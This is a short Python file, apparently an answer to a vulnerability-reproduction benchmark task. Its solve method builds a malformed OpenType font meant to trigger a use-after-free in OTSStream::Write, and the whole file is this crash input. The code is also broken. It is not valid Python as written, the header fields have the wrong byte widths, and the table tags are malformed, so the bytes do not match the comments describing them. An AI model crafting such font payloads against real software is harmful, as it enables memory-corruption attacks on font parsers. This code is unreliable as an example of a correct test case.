class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed OpenType font to trigger UAF in OTSStream::Write
        # This is a crafted PoC based on vulnerability analysis
        poc = b'\x00\x01\x00\x00\x00' +  # sfnt version
              b'\x00\x02' +              # numTables: 2
              b'\x50\x00\x00\x00' +      # searchRange
              b'\x02\x00\x00\x00' +      # entrySelector
              b'\x0e\x00\x00\x00' +      # rangeShift
              # Table 1: HEAD (invalid offset to cause free and reuse)
              b'head\x00\x00\x00\x00' +  # tag
              b'\x00\x00\x00\x20' +      # checksum
              b'\x00\x00\x00\x00' +      # offset: 0 (invalid, triggers UAF during write)
              b'\x00\x00\x01\x00' +      # length: 256
              # Table 2: Invalid table to cause stream write after free
              b'hhea\x00\x00\x00' +      # tag (incomplete)
              b'\x00\x00\x00\x00' +      # checksum
              b'\x00\x00\x00\x00' +      # offset: 0
              b'\x00\x00\x00\x80' +      # length: 128
              # Padding to reach approximately 800 bytes with junk data
              b'\x00' * 700
        # Adjust length to exactly 800 bytes
        poc = poc[:800]
        while len(poc) < 800:
            poc += b'\x00'
        poc = poc[:800]
        return poc